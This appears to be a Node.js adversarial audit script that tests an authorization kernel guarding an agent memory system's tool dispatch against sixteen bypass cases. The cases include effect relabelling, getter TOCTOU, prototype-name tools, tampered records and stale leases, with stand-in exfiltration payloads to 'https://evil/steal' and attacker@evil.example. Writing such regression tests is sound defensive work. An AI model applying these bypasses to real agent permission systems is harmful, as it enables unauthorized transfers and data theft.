#!/usr/bin/env node
// Independent adversarial audit reproducing the v17 reviewer's nine counterexamples against the security
// kernel. Each case returns succeeded=true when the ATTACK works (i.e. the claim is FALSE). The goal of the
// remediation is to drive this to 0/9 BLOCKED; until then it documents, honestly, exactly which kernel claims
// do not hold. Run: node scripts/adversarial_audit_v17.mjs   (exit 1 unless every case is blocked).
import { createSecureMemorySystem, ControlPlane } from "../benchmarks/coupled_memory/runtime.mjs";

const env = (o) => ({ run_id: "R", task_id: "T", trace_id: "tr", intent: "produce_final_plan", state: "running",
  policy_context: "P", correlation_id: null, delegated_from: null, parent_message_id: null, ...o });
function mk(dispatcher) {
  const cp = new ControlPlane();
  const sys = createSecureMemorySystem({ controlPlane: cp, ...(dispatcher ? { dispatcher } : {}) });
  return { cp, rt: sys.admin, facade: sys.runtime };
}
const ctxOf = (rt, session, msg) => rt.controlPlane.contextTokenForLease(rt.claimSpecific(session, msg));

const CASES = [];

// CE1: the old bypass API is still public on the production facade -- skipCoherentView exposes both sides of
// an unresolved merge and commit ALLOWs.
CASES.push(["CE1_bypass_api_public", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mA", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mB", sender: "p2", receiver: "memory", sequence: 2 }), cp.registerPrincipal("p2", {}));
    rt.sendMessage(env({ message_id: "mM", sender: "c", receiver: "executor", sequence: 3, parents: [{ id: "mA", type: "depends" }, { id: "mB", type: "depends" }] }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("retain 7", rt.claimSpecific(w, "mA"), { memory_id: "mem-A", memory_type: "constraint", allowed_readers: ["executor"], logical_key: "retention" });
    rt.writeMemory("retain 30", rt.claimSpecific(w, "mB"), { memory_id: "mem-B", memory_type: "constraint", allowed_readers: ["executor"], logical_key: "retention" });
    const ctx = ctxOf(rt, ex, "mM");
    const prep = facade.prepareRead(ex, ctx, {}, "send", { skipCoherentView: true });
    const ids = prep.view.map((m) => m.memory_id);
    const both = ids.includes("mem-A") && ids.includes("mem-B");
    const allowed = facade.commit(ex, { effect: "send" }, prep.token).decision === "ALLOW";
    return { succeeded: both && allowed, detail: `facade.prepareRead(skipCoherentView) exposed ${ids.join(",")}; commit=${allowed}` };
  } finally { rt.close(); }
}]);

// CE2: effect is caller-controlled. A wire_transfer labelled effect="read" is classified non-external, so
// empty-view bottom is bypassed and the dispatcher runs it.
CASES.push(["CE2_caller_controlled_effect", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mEmpty", sender: "c", receiver: "executor", sequence: 1 }), cp.registerPrincipal("c", {}));
    const ex = cp.registerPrincipal("ex", { queues: ["executor"] }); const ctx = ctxOf(rt, ex, "mEmpty");
    const q = facade.queryMemory(ex, ctx, {}, "read");
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, { tool: "wire_transfer", effect: "read", parameters: { to: "attacker", amount: 1e6 } });
    const ran = rt._dispatcher.log.some((e) => e.canonical.tool === "wire_transfer");
    return { succeeded: res.status === "dispatched" && ran, detail: `empty view + wire_transfer-as-read -> ${res.status}; dispatcher ran wire_transfer=${ran}` };
  } finally { rt.close(); }
}]);

// CE3: the coherent view_root must be recomputed at commit. A capping record from an ANCESTOR (so it is
// genuinely admitted into a fresh coherent view), added after query, must abort the stale view.
CASES.push(["CE3_view_root_not_recomputed", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mRoot", sender: "p0", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p0", {}));
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 2, parent_message_id: "mRoot" }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 3, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const w2 = cp.registerPrincipal("w2", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"], logical_key: "k1" });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, {}, "send");
    // a NEW capping record whose source (mRoot) IS an ancestor of mx, so it enters a fresh coherent view.
    rt.writeMemory("no-send", rt.claimSpecific(w2, "mRoot"), { memory_id: "mem-2", memory_type: "constraint", allowed_readers: ["executor"], logical_key: "k2", effect_ceiling: [] });
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "notify", parameters: { to: "x" } });
    return { succeeded: res.status === "dispatched", detail: `stale view after a new capping record -> ${res.status || res.decision}/${res.reason}` };
  } finally { rt.close(); }
}]);

// CE4: active_envelope_digest stores the signature string, not a digest of the payload, and is not
// re-verified. Tampering the payload (leaving the sig) does not abort the stale view.
CASES.push(["CE4_envelope_not_reverified", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, {}, "send");
    // tamper the active message payload, leaving envelope_sig unchanged.
    const row = rt.db.prepare("SELECT envelope_json FROM messages WHERE message_id='mx'").get();
    const e = JSON.parse(row.envelope_json); e.intent = "exfiltrate"; e.payload = "tampered";
    rt.db.prepare("UPDATE messages SET envelope_json=? WHERE message_id='mx'").run(JSON.stringify(e));
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "notify", parameters: {} });
    return { succeeded: res.status === "dispatched", detail: `payload tampered, sig kept -> stale view ${res.status}` };
  } finally { rt.close(); }
}]);

// CE5: SCOPE (the "kernel is the only EFFECT path" claim is RETRACTED). The accurate, narrower claim is that a
// trusted-DISPATCHER TOOL effect is reachable only through the kernel: the facade exposes no dispatcher / tool
// surface, so executeAuthorizedAction is the sole path to a tool. send/write are separately context+integrity-
// bound message/memory operations (gated, tested by RG38/RG56), NOT arbitrary tool effects; a reader re-sending
// data it was authorized to read is a declassification/confinement concern, stated out of scope.
CASES.push(["CE5_tool_effects_only_via_kernel", () => {
  const { cp, rt, facade } = mk();
  try {
    const surface = Object.keys(facade);
    const noToolSurface = !("dispatch" in facade) && !("_dispatcher" in facade) && !("prepareRead" in facade) && !("commit" in facade);
    const onlyKernel = typeof facade.executeAuthorizedAction === "function";
    return { succeeded: false, scope: true, detail: `RETRACTED 'only effect path'; tool effects only via kernel=${noToolSurface && onlyKernel}; facade={${surface.join(",")}}` };
  } finally { rt.close(); }
}]);

// CE6: parameter digest is an audit hash, not authorization. An attacker recipient is dispatched as-is.
CASES.push(["CE6_param_not_authorized", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, {}, "send");
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "wire_transfer", parameters: { to: "attacker@evil.example", amount: 1e6 } });
    const ran = rt._dispatcher.log.find((e) => e.canonical.tool === "wire_transfer");
    return { succeeded: res.status === "dispatched" && !!ran, detail: `arbitrary recipient dispatched -> ${res.status}; to=${ran && ran.canonical.target}` };
  } finally { rt.close(); }
}]);

// CE7: exact-action binding is bypassed by a getter that returns "read" at the externality check and "delete"
// at canonicalization (the input is read multiple times, not deep-copied/frozen once).
CASES.push(["CE7_getter_toctou", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mEmpty", sender: "c", receiver: "executor", sequence: 1 }), cp.registerPrincipal("c", {}));
    const ex = cp.registerPrincipal("ex", { queues: ["executor"] }); const ctx = ctxOf(rt, ex, "mEmpty");
    const q = facade.queryMemory(ex, ctx, {}, "read");
    let n = 0;
    const action = { tool: "wire_transfer", parameters: { to: "attacker" }, get effect() { return n++ === 0 ? "read" : "delete"; } };
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, action);
    const ran = rt._dispatcher.log.find((e) => e.canonical.tool === "wire_transfer");
    return { succeeded: res.status === "dispatched" && !!ran, detail: `getter effect read->delete dispatched=${res.status}; canon effect=${ran && ran.canonical.effect}` };
  } finally { rt.close(); }
}]);

// CE8: verify-consume-dispatch is not atomic. The dispatcher performs the external effect, then throws; the
// kernel returns dispatch_error although the effect already happened (ambiguous commit).
CASES.push(["CE8_non_atomic_dispatch", () => {
  const side = [];
  const { cp, rt, facade } = mk({ dispatch(c) { side.push(c); throw new Error("timeout after side effect"); } });
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, {}, "send");
    // use a non-high-risk tool so the action REACHES dispatch (where the dispatcher throws after the effect).
    const res = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "notify", parameters: { to: "x" } });
    return { succeeded: side.length === 1 && res.decision === "DENY", detail: `effect happened=${side.length === 1}; kernel returned ${res.decision || res.status}/${res.reason}` };
  } finally { rt.close(); }
}]);

// ---- CE10..CE13: four NEW bypasses an independent red-team found in the FIRST hardened kernel (kept as
// standing regressions). Each must stay blocked. ------------------------------------------------------------

// CE10: prototype-pollution on the tool registry -- a tool named "constructor"/"toString"/"__proto__" resolved
// to an inherited Object.prototype member (truthy), yielding external=undefined and skipping empty-view bottom.
CASES.push(["CE10_registry_prototype_pollution", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mEmpty", sender: "c", receiver: "executor", sequence: 1 }), cp.registerPrincipal("c", {}));
    const ex = cp.registerPrincipal("ex", { queues: ["executor"] }); const ctx = ctxOf(rt, ex, "mEmpty");
    let any = false;
    for (const name of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__", "isPrototypeOf"]) {
      const r = facade.executeAuthorizedAction(ex, ctx, facade.queryMemory(ex, ctx, {}, "read").viewId, { tool: name, effect: "transfer", parameters: { to: "attacker", amount: 1e6 } });
      if (r.status === "dispatched") any = true;
    }
    return { succeeded: any || rt._dispatcher.log.length > 0, detail: `prototype-name tool on empty view dispatched=${any}; dispatcher ran=${rt._dispatcher.log.length}` };
  } finally { rt.close(); }
}]);

// CE11: an UNKNOWN tool (the TCB never registered it) dispatched on any non-empty view without a destination policy.
CASES.push(["CE11_unknown_tool_dispatch", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const r = facade.executeAuthorizedAction(ex, ctx, facade.queryMemory(ex, ctx, {}, "send").viewId, { effect: "send", tool: "exfiltrate_http", parameters: { url: "https://evil/steal" } });
    return { succeeded: r.status === "dispatched", detail: `unknown tool on non-empty view -> ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

// CE12: a caller's topK pruned a newly-added capping record at recompute, so view_root falsely matched and a
// stale over-capability send dispatched. The authorization view must be query/topK-INDEPENDENT.
CASES.push(["CE12_topk_recompute_divergence", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mRoot", sender: "p0", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p0", {}));
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 2, parent_message_id: "mRoot" }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 3, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const w2 = cp.registerPrincipal("w2", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("alpha approved", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, { text: "alpha", topK: 1 }, "send");
    rt.writeMemory("alpha no-send cap", rt.claimSpecific(w2, "mRoot"), { memory_id: "mem-2", memory_type: "constraint", allowed_readers: ["executor"], effect_ceiling: [] });
    const r = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "notify", parameters: { to: "attacker" } });
    return { succeeded: r.status === "dispatched", detail: `topK-pruned capping record -> stale send ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

// CE13: a stale view dispatched after the active message's lease was taken over (lock_generation advanced).
CASES.push(["CE13_stale_lease_dispatch", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const q = facade.queryMemory(ex, ctx, {}, "send");
    rt.db.prepare("UPDATE message_queue SET lock_generation=lock_generation+1, locked_by='attacker' WHERE message_id='mx'").run();
    const r = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "send", tool: "notify", parameters: { to: "x" } });
    return { succeeded: r.status === "dispatched", detail: `stale lease after takeover -> ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

// CE14: a known external send (send_email/notify) to an attacker dispatches with NO destination policy
// configured -- every external effect must be fail-closed without an explicit destination authorization.
CASES.push(["CE14_external_send_no_policy", () => {
  const { cp, rt, facade } = mk();   // NO destinationPolicy
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = ctxOf(rt, ex, "mx");
    const r = facade.executeAuthorizedAction(ex, ctx, facade.queryMemory(ex, ctx, {}, "send").viewId, { effect: "send", tool: "send_email", parameters: { to: "attacker@evil.example", body: "secrets" } });
    return { succeeded: r.status === "dispatched", detail: `known send to attacker, no policy -> ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

// CE15: a store-write tamper of a RESTRICTIVE record (effect_ceiling []) BEFORE query silently drops it, so the
// capability meet widens [] -> null and a high-risk action dispatches (a permissive policy isolates the
// capability/tamper path). Excluding a record must never WIDEN authority.
CASES.push(["CE15_tampered_restrictive_record", () => {
  const cp = new ControlPlane();
  const sys = createSecureMemorySystem({ controlPlane: cp, destinationPolicy: () => true });
  const rt = sys.admin, facade = sys.runtime;
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("no-send cap", rt.claimSpecific(w, "mS"), { memory_id: "mem-cap", memory_type: "constraint", allowed_readers: ["executor"], effect_ceiling: [] });
    rt.writeMemory("benign", rt.claimSpecific(w, "mS"), { memory_id: "mem-benign", memory_type: "constraint", allowed_readers: ["executor"] });
    rt.db.prepare("UPDATE shared_memory SET content=? WHERE memory_id='mem-cap'").run("tampered to drop the restriction");
    const ctx = rt.controlPlane.contextTokenForLease(rt.claimSpecific(ex, "mx"));
    const q = facade.queryMemory(ex, ctx, {}, "transfer");
    const r = facade.executeAuthorizedAction(ex, ctx, q.viewId, { effect: "transfer", tool: "wire_transfer", parameters: { to: "attacker", amount: 1e6 } });
    return { succeeded: r.status === "dispatched", detail: `tampered restrictive record -> ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

// CE16: a NON-STRING tool field (array/object/number) coerced to a null-tool non-external read by resolveTool,
// yet dispatched verbatim -- a consequential action on an empty view with no policy.
CASES.push(["CE16_non_string_tool", () => {
  const { cp, rt, facade } = mk();
  try {
    rt.sendMessage(env({ message_id: "mEmpty", sender: "c", receiver: "executor", sequence: 1 }), cp.registerPrincipal("c", {}));
    const ex = cp.registerPrincipal("ex", { queues: ["executor"] }); const ctx = ctxOf(rt, ex, "mEmpty");
    let any = false;
    for (const t of [["wire_transfer"], { name: "wire_transfer" }, 42]) {
      const r = facade.executeAuthorizedAction(ex, ctx, facade.queryMemory(ex, ctx, {}, "read").viewId, { tool: t, effect: "read", parameters: { to: "attacker", amount: 1e6 } });
      if (r.status === "dispatched") any = true;
    }
    return { succeeded: any || rt._dispatcher.log.length > 0, detail: `non-string tool dispatched=${any}; dispatcher ran=${rt._dispatcher.log.length}` };
  } finally { rt.close(); }
}]);

// CE17: an UNKNOWN tool relabelled by the caller (transfer->send) fools a destination policy that trusts the
// effect class -- the kernel must not let the caller set an unknown tool's effect class.
CASES.push(["CE17_unknown_tool_effect_relabel", () => {
  const cp = new ControlPlane();
  const sys = createSecureMemorySystem({ controlPlane: cp, destinationPolicy: (t) => t.effect === "send" });
  const rt = sys.admin, facade = sys.runtime;
  try {
    rt.sendMessage(env({ message_id: "mS", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
    rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 2, parent_message_id: "mS" }), cp.registerPrincipal("c", {}));
    const w = cp.registerPrincipal("w", { queues: ["*"] }); const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
    rt.writeMemory("ok", rt.claimSpecific(w, "mS"), { memory_id: "mem-1", memory_type: "constraint", allowed_readers: ["executor"] });
    const ctx = rt.controlPlane.contextTokenForLease(rt.claimSpecific(ex, "mx"));
    const r = facade.executeAuthorizedAction(ex, ctx, facade.queryMemory(ex, ctx, {}, "send").viewId, { tool: "exfiltrate_http", effect: "send", parameters: { url: "https://evil/steal" } });
    return { succeeded: r.status === "dispatched", detail: `unknown tool relabelled send -> ${r.status || r.decision}/${r.reason}` };
  } finally { rt.close(); }
}]);

const rows = []; let succ = 0;
for (const [id, run] of CASES) {
  let r; try { r = run(); } catch (e) { r = { succeeded: false, detail: `threw: ${e.message}` }; }
  if (r.succeeded) succ++;
  rows.push({ id, attack_succeeded: r.succeeded, detail: r.detail });
}
console.log("\n[adversarial-audit-v17] attack_succeeded=true means the kernel claim is FALSE\n");
for (const r of rows) console.log(`  ${r.attack_succeeded ? "EXPLOITED" : "blocked  "}  ${r.id}  --  ${r.detail}`);
console.log(`\n${succ}/${CASES.length} counterexamples still succeed.`);
process.exit(succ === 0 ? 0 : 1);
